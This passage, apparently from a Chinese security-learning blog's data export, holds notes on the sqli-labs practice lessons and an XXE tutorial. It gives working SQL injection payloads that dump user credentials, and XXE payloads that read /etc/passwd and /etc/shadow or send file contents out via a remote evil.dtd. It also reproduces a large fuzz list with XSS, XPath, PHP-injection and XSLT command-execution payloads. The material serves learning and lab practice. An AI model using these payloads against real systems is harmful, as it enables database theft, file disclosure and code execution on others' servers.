class=\"number\">23</span></span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<p>sqli-labs</p>\n<p>less3   less4</p>\n<p>less4(只需要将less3中的单引号换成双引号即可),同时less4也可通过报错注入</p>\n<p>通过单引号报错信息</p>\n<p>推测可能在接收参数后添加了( )包裹了id参数</p>\n<p><img src=\"/images/sqli-labs/Image.png\"></p>\n<p><img src=\"/images/sqli-labs/Image%20%5B1%5D.png\"></p>\n<p>通过构造闭合即可</p>\n<p>id=1’)%23</p>\n<p>接下来用union联合注入即可</p>\n<p>less4报错注入:通过检测,发现用双引号和括号对id进行了包裹,测试出的可用语句为id=1”) and 1=1%23</p>\n<p>根据报错注入公式,开始操作</p>\n<p>库名</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span>&quot;)and extractvalue(1,concat(&#x27;~&#x27;,(select database())))%23</span><br></pre></td></tr></table></figure>\n\n<p>表名</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span>&quot;)and extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)))%23</span><br></pre></td></tr></table></figure>\n\n<p>列名</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span>&quot;)and extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)))%23</span><br></pre></td></tr></table></figure>\n\n<p>利用right和left函数相互配合爆出字段名s</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span>&quot;)and%20extractvalue(1,concat(%27~%27,(right((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27),20))))%23</span><br></pre></td></tr></table></figure>\n\n<p>如法炮制,爆数据即可</p>\n<h5 id=\"less-7\"><a href=\"#less-7\" class=\"headerlink\" title=\"less 7\"></a>less 7</h5><p>本题经过尝试得到后台为((‘ ‘))包裹参数,可以通过页面显示,变化来进行盲注但是根据本题标题,提示使用outfile函数来进行注入<br>1.要使用outfile首先要知道绝对路径</p>\n<p>通过之前的less进行查询</p>\n<p>@@basedir是mysql安装路径</p>\n<p>@@datadir是数据库路径</p>\n<p><img src=\"/images/sqli-labs/1.png\"></p>\n<p>2.读写权限测试mysql快速查看读写权限</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">show</span> variables <span class=\"keyword\">like</span> <span class=\"string\">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqli-labs/2.png\"></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27;)) and (select count(*) from mysql.user)&gt;0%23</span></span><br></pre></td></tr></table></figure>\n\n<p>如果返回正常,则说明有读写权限</p>\n<p><img src=\"/images/sqli-labs/3.png\"></p>\n<p>其次在linux中还需要mysql用户对目录有w权限才能写入</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"operator\">%</span><span class=\"number\">27</span>))<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">union</span><span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">select</span><span class=\"operator\">%</span><span class=\"number\">201</span>,<span class=\"number\">2</span>,table_name<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">from</span><span class=\"operator\">%</span><span class=\"number\">20</span>information_schema.tables<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">where</span><span class=\"operator\">%</span><span class=\"number\">20</span>table_schema<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"operator\">=</span><span class=\"operator\">%</span><span class=\"number\">27</span>security<span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">into</span><span class=\"operator\">%</span><span class=\"number\">20</span>outfile<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">/</span>www<span class=\"operator\">/</span>wwwroot<span class=\"operator\">/</span>sqli<span class=\"operator\">-</span>labs<span class=\"operator\">/</span>Less<span class=\"number\">-7</span><span class=\"operator\">/</span><span class=\"number\">2.</span>txt<span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">%</span><span class=\"number\">23</span></span><br></pre></td></tr></table></figure>\n\n<p>通过上述语句查询表名,写入到2.txt</p>\n<p><img src=\"/images/sqli-labs/4.png\"></p>\n<p>貌似文件只能新建,不能重复写入<br>查询列名</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"operator\">%</span><span class=\"number\">27</span>))<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">union</span><span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">select</span><span class=\"operator\">%</span><span class=\"number\">201</span>,<span class=\"number\">2</span>,column_name<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">from</span><span class=\"operator\">%</span><span class=\"number\">20</span>information_schema.columns<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">where</span><span class=\"operator\">%</span><span class=\"number\">20</span>table_name<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"operator\">=</span><span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"operator\">%</span><span class=\"number\">27</span>users<span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">into</span><span class=\"operator\">%</span><span class=\"number\">20</span>outfile<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">/</span>www<span class=\"operator\">/</span>wwwroot<span class=\"operator\">/</span>sqli<span class=\"operator\">-</span>labs<span class=\"operator\">/</span>Less<span class=\"number\">-7</span><span class=\"operator\">/</span><span class=\"number\">3.</span>txt<span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">%</span><span class=\"number\">23</span></span><br></pre></td></tr></table></figure>\n\n<p>查询数据</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"operator\">%</span><span class=\"number\">27</span>))<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">union</span><span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">select</span><span class=\"operator\">%</span><span class=\"number\">201</span>,username,password<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">from</span><span class=\"operator\">%</span><span class=\"number\">20</span>security.users<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">into</span><span class=\"operator\">%</span><span class=\"number\">20</span>outfile<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">/</span>www<span class=\"operator\">/</span>wwwroot<span class=\"operator\">/</span>sqli<span class=\"operator\">-</span>labs<span class=\"operator\">/</span>Less<span class=\"number\">-7</span><span class=\"operator\">/</span><span class=\"number\">4.</span>txt<span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">%</span><span class=\"number\">23</span></span><br></pre></td></tr></table></figure>\n\n"},{"title":"xxe","date":"2021-12-24T13:46:28.000Z","typora-root-url":"..","description":"xxe","_content":"\n## xxe\n\nxxe全程XML External Entity Injection即xml外部实体注入漏洞,XXE漏洞发生在**应用程序解析XML输入时,没有禁止外部实体的加载**,导致可能加载恶意外部文件,造成文件读取,命令执行,内网探测...\n\n#### DTD\n\nDocument Type Definition 文档类型定义\n\n##### DTD示例\n\n`<!ELEMENT 元素名 类型>`\n\n文件名xxe.dtd\n\nELEMENT大概作用是定义标签元素的类型\n\n```dtd\n<!ELEMENT 班级 (学生+)>\n<!ELEMENT 学生 (名字,年龄,介绍)>\n<!ELEMENT 名字 (#PCDATA)>\n<!ELEMENT 年龄 (#PCDATA)>\n<!ELEMENT 介绍 (#PCDATA)>\n```\n\n##### PCDATA\n\nPCDATA 的意思是被解析的字符数据（parsed character data）。\nPCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。\n\n##### CDATA\n\nCDATA 的意思是字符数据（character data）。\nCDATA 是不会被解析器解析的文本。\n\n##### XML示例\n\n班级为根元素\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<!DOCTYPE 班级 SYSTEM \"xxe.dtd\">\n<班级>\n\t<学生>\n        <名字>张三</名字>\n        <年龄>19</年龄>\n        <介绍>好孩子</介绍>\n    </学生>\n    <学生>\n        <名字>小明</名字>\n        <年龄>21</年龄>\n        <介绍>学习认真</介绍>\n    </学生>\n</班级>\n```\n\n内部DTD\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<!DOCTYPE 班级 [\n<!ELEMENT 班级 (学生+)>\n<!ELEMENT 学生 (名字,年龄,介绍)>\n<!ELEMENT 名字 (#PCDATA)>\n<!ELEMENT 年龄 (#PCDATA)>\n<!ELEMENT 介绍 (#PCDATA)>\n]>\n<班级>\n\t<学生>\n        <名字>张三</名字>\n        <年龄>19</年龄>\n        <介绍>好孩子</介绍>\n    </学生>\n    <学生>\n        <名字>小明</名字>\n        <年龄>21</年龄>\n        <介绍>学习认真</介绍>\n    </学生>\n</班级>\n```\n\n\n\n#### 具体操作\n\n##### 内部实体\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<!DOCTYPE neo[\n\t<!ELEMENT neo ANY>\n\t<!ENTITY xxe \"hello\">\n]>\n<neo>&xxe;</neo>\n```\n\n会在页面回显hello\n\n##### 外部实体\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<!DOCTYPE neo[\n\t<!ELEMENT neo ANY>\n\t<!ENTITY xxe SYSTEM \"文档URL\">\n]>\n<neo>&xxe;</neo>\n```\n\n##### 参数实体\n\n参数实体只能在DTD文档中定义,DTD中引用\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<!DOCTYPE neo[\n\t<!ELEMENT neo ANY>\n\t<!ENTITY % xxe SYSTEM \"http://xxx.xxx.xxx/evil.dtd\">\n\t%xxe;\n\n]>\n<neo>&evil;</neo>\n```\n\n#### 攻击方式\n\n##### 直接通过DTD外部实体声明\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<!DOCTYPE neo[\n\t<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<c>&xxe;</c>\n```\n\n##### 通过DTD文档引入外部DTD文档,再引入外部实体声明\n\nxml内容\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE neo SYSTEM \"dtd文档url\">\n<c>&xxe;</c>\n```\n\ndtd内容\n\n```dtd\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n```\n\n##### 通过参数实体(OOB)\n\n先写一个外部实体声明,然后引用在攻击者服务器上面的外部实体声明\n\nxml内容\n\n##### %作用\n\n就我的理解,百分号可以类比于一段命令,它可以在dtd中被定义和执行,它在实例中相当于变量,在xml中相当于命令?\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE a [\n\t<!ENTITY %d SYSTEM \"http://xxx.xxx/evil.dtd\">\n\t%d;\n]>\n<c>&b;</c>\n```\n\ndtd文件内容\n\n```dtd\n<!ENTITY b SYSTEM \"file:///etc/passwd\">\n```\n\n#### 协议支持\n\n![image-20220108211411539](https://gitee.com/blue_satchel/images/raw/master/image-20220108211411539.png)\n\n##### XInclude(命名空间)\n\n导入外部xml文档，类似于php的include，将外部定义的dtd引入当前文件，因为引入外部实体具有局限性，所以使用xinclude来引入\n\n 本质是使用`http://www.w3.org/2003/XInclude` 命名空间中的两个元素，即 include 和 fallback。常用的命名空间前缀是“xi”（但可以根据喜好自由使用任何前缀）\n\n首先使用xmls来定义命名空间为xi\n\n然后接下来就可以使用定义好的xi命名空间中的include来包含文件了,parse可以将文件属性进行转换,转换成text进行包含输出\n\n一个例子\n\n```xml\n<foo xmlns:xi=\"http://www.we.org/2003/XInclude\">\n    <xi:include parse=\"text\" href=\"file:///etc/passwd\"/>//    单标签别忘了反斜杠\n</foo>\n```\n\n##### SVG(矢量图)\n\n使用Apache中的Batik库解析矢量图,可以解析xml文档\n\n![image-20220109171338198](https://gitee.com/blue_satchel/images/raw/master/image-20220109171338198.png)\n\n##### 对大佬写的xxe fuzz的阅读理解\n\n```xml\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE xxe [<!ENTITY foo \"aaaaaa\">]>\n<!DOCTYPE xxe [<!ENTITY foo \"aaaaaa\">]><root>&foo;</root>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE xxe [<!ENTITY foo \"aaaaaa\">]>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE xxe [<!ENTITY foo \"aaaaaa\">]><root>&foo;</root>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><test></test>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/issue\" >]><foo>&xxe;</foo>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/issue\" >]>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/shadow\" >]><foo>&xxe;</foo>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/shadow\" >]>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" >]><foo>&xxe;</foo>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" >]>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://example.com:80\" >]><foo>&xxe;</foo>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://example:443\" >]>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:////dev/random\">]><foo>&xxe;</foo>\n<test></test>\n<![CDATA[<test></test>]]>\n&foo;\n%foo;\ncount(/child::node())\nx' or name()='username' or 'x'='y\n<name>','')); phpinfo(); exit;/*</name>\n<![CDATA[<script>var n=0;while(true){n++;}</script>]]>\n<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>\n<foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><foo><![CDATA[' or 1=1 or ''=']]></foo>\n<foo><![CDATA[' or 1=1 or ''=']]></foo>\n<xml ID=I><X><C><![CDATA[<IMG SRC=\"javas]]><![CDATA[cript:alert('XSS');\">]]>\n<xml ID=\"xss\"><I><B>&lt;IMG SRC=\"javas<!-- -->cript:alert('XSS')\"&gt;</B></I></xml><SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>\n<xml SRC=\"xsstest.xml\" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>\n<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>\n<xml SRC=\"xsstest.xml\" ID=I></xml>\n<HTML xmlns:xss><?import namespace=\"xss\" implementation=\"http://ha.ckers.org/xss.htc\"><xss:xss>XSS</xss:xss></HTML>\n<HTML xmlns:xss><?import namespace=\"xss\" implementation=\"http://ha.ckers.org/xss.htc\">\n<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\"><xsl:template match=\"/\"><script>alert(123)</script></xsl:template></xsl:stylesheet>\n<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\"><xsl:template match=\"/\"><xsl:copy-of select=\"document('/etc/passwd')\"/></xsl:template></xsl:stylesheet>\n<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\"><xsl:template match=\"/\"><xsl:value-of select=\"php:function('passthru','ls -la')\"/></xsl:template></xsl:stylesheet>\n<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/shadow\" >]>\n<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" >]>\n<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://example.com/text.txt\" >]>\n<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:////dev/random\">]>\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'http://127.0.0.1:80/?%file;'>  \"> %int;\n<!DOCTYPE xxe [ <!ENTITY % file SYSTEM \"file:///etc/issue\"><!ENTITY % dtd SYSTEM \"http://example.com/evil.dtd\">%dtd;%trick;]>\n<!DOCTYPE xxe [ <!ENTITY % file SYSTEM \"file:///c:/boot.ini\"><!ENTITY % dtd SYSTEM \"http://example.com/evil.dtd\">%dtd;%trick;]>\n```\n\n","source":"_posts/xxe.md","raw":"---\ntitle: xxe\ndate: 2021-12-24 21:46:28\ntags:\n      - xxe\ncategories: web基础\ntypora-root-url: ..\ndescription: xxe\n---\n\n## xxe\n\nxxe全程XML External Entity Injection即xml外部实体注入漏洞,XXE漏洞发生在**应用程序解析XML输入时,没有禁止外部实体的加载**,导致可能加载恶意外部文件,造成文件读取,命令执行,内网探测...\n\n#### DTD\n\nDocument Type Definition 文档类型定义\n\n##### DTD示例\n\n`<!ELEMENT 元素名 类型>`\n\n文件名xxe.dtd\n\nELEMENT大概作用是定义标签元素的类型\n\n```dtd\n<!ELEMENT 班级 (学生+)>\n<!ELEMENT 学生 (名字,年龄,介绍)>\n<!ELEMENT 名字 (#PCDATA)>\n<!ELEMENT 年龄 (#PCDATA)>\n<!ELEMENT 介绍 (#PCDATA)>\n```\n\n##### PCDATA\n\nPCDATA 的意思是被解析的字符数据（parsed character data）。\nPCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。\n\n##### CDATA\n\nCDATA 的意思是字符数据（character data）。\nCDATA 是不会被解析器解析的文本。\n\n##### XML示例\n\n班级为根元素\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<!DOCTYPE 班级 SYSTEM \"xxe.dtd\">\n<班级>\n\t<学生>\n        <名字>张三</名字>\n        <年龄>19</年龄>\n        <介绍>好孩子</介绍>\n    </学生>\n    <学生>\n        <名字>小明</名字>\n        <年龄>21</年龄>\n        <介绍>学习认真</介绍>\n    </学生>\n</班级>\n```\n\n内部DTD\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<!DOCTYPE 班级 [\n<!ELEMENT 班级 (学生+)>\n<!ELEMENT 学生 (名字,年龄,介绍)>\n<!ELEMENT 名字 (#PCDATA)>\n<!ELEMENT 年龄 (#PCDATA)>\n<!ELEMENT 介绍 (#PCDATA)>\n]>\n<班级>\n\t<学生>\n        <名字>张三</名字>\n        <年龄>19</年龄>\n        <介绍>好孩子</介绍>\n    </学生>\n    <学生>\n        <名字>小明</名字>\n        <年龄>21</年龄>\n        <介绍>学习认真</介绍>\n    </学生>\n</班级>\n```\n\n\n\n#### 具体操作\n\n##### 内部实体\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<!DOCTYPE neo[\n\t<!ELEMENT neo ANY>\n\t<!ENTITY xxe \"hello\">\n]>\n<neo>&xxe;</neo>\n```\n\n会在页面回显hello\n\n##### 外部实体\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<!DOCTYPE neo[\n\t<!ELEMENT neo ANY>\n\t<!ENTITY xxe SYSTEM \"文档URL\">\n]>\n<neo>&xxe;</neo>\n```\n\n##### 参数实体\n\n参数实体只能在DTD文档中定义,DTD中引用\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<!DOCTYPE neo[\n\t<!ELEMENT neo ANY>\n\t<!ENTITY % xxe SYSTEM \"http://xxx.xxx.xxx/evil.dtd\">\n\t%xxe;\n\n]>\n<neo>&evil;</neo>\n```\n\n#### 攻击方式\n\n##### 直接通过DTD外部实体声明\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<!DOCTYPE neo[\n\t<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<c>&xxe;</c>\n```\n\n##### 通过DTD文档引入外部DTD文档,再引入外部实体声明\n\nxml内容\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE neo SYSTEM \"dtd文档url\">\n<c>&xxe;</c>\n```\n\ndtd内容\n\n```dtd\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n```\n\n##### 通过参数实体(OOB)\n\n先写一个外部实体声明,然后引用在攻击者服务器上面的外部实体声明\n\nxml内容\n\n##### %作用\n\n就我的理解,百分号可以类比于一段命令,它可以在dtd中被定义和执行,它在实例中相当于变量,在xml中相当于命令?\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE a [\n\t<!ENTITY %d SYSTEM \"http://xxx.xxx/evil.dtd\">\n\t%d;\n]>\n<c>&b;</c>\n```\n\ndtd文件内容\n\n```dtd\n<!ENTITY b SYSTEM \"file:///etc/passwd\">\n```\n\n#### 协议支持\n\n![image-20220108211411539](https://gitee.com/blue_satchel/images/raw/master/image-20220108211411539.png)\n\n##### XInclude(命名空间)\n\n导入外部xml文档，类似于php的include，将外部定义的dtd引入当前文件，因为引入外部实体具有局限性，所以使用xinclude来引入\n\n 本质是使用`http://www.w3.org/2003/XInclude` 命名空间中的两个元素，即 include 和 fallback。常用的命名空间前缀是“xi”（但可以根据喜好自由使用任何前缀）\n\n首先使用xmls来定义命名空间为xi\n\n然后接下来就可以使用定义好的xi命名空间中的include来包含文件了,parse可以将文件属性进行转换,转换成text进行包含输出\n\n一个例子\n\n```xml\n<foo xmlns:xi=\"http://www.we.org/2003/XInclude\">\n    <xi:include parse=\"text\" href=\"file:///etc/passwd\"/>//    单标签别忘了反斜杠\n</foo>\n```\n\n##### SVG(矢量图)\n\n使用Apache中的Batik库解析矢量图,可以解析xml文档\n\n![image-20220109171338198](https://gitee.com/blue_satchel/images/raw/master/image-20220109171338198.png)\n\n##### 对大佬写的xxe fuzz的阅读理解\n\n```xml\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE xxe [<!ENTITY foo \"aaaaaa\">]>\n<!DOCTYPE xxe [<!ENTITY foo \"aaaaaa\">]><root>&foo;</root>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE xxe [<!ENTITY foo \"aaaaaa\">]>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE xxe [<!ENTITY foo \"aaaaaa\">]><root>&foo;</root>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><test></test>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/issue\" >]><foo>&xxe;</foo>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/issue\" >]>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/shadow\" >]><foo>&xxe;</foo>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/shadow\" >]>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" >]><foo>&xxe;</foo>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" >]>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://example.com:80\" >]><foo>&xxe;</foo>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://example:443\" >]>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:////dev/random\">]><foo>&xxe;</foo>\n<test></test>\n<![CDATA[<test></test>]]>\n&foo;\n%foo;\ncount(/child::node())\nx' or name()='username' or 'x'='y\n<name>','')); phpinfo(); exit;/*</name>\n<![CDATA[<script>var n=0;while(true){n++;}</script>]]>\n<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>\n<foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><foo><![CDATA[' or 1=1 or ''=']]></foo>\n<foo><![CDATA[' or 1=1 or ''=']]></foo>\n<xml ID=I><X><C><![CDATA[<IMG SRC=\"javas]]><![CDATA[cript:alert('XSS');\">]]>\n<xml ID=\"xss\"><I><B>&lt;IMG SRC=\"javas<!-- -->cript:alert('XSS')\"&gt;</B></I></xml><SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>\n<xml SRC=\"xsstest.xml\" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>\n<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>\n<xml SRC=\"xsstest.xml\" ID=I></xml>\n<HTML xmlns:xss><?import namespace=\"xss\" implementation=\"http://ha.ckers.org/xss.htc\"><xss:xss>XSS</xss:xss></HTML>\n<HTML 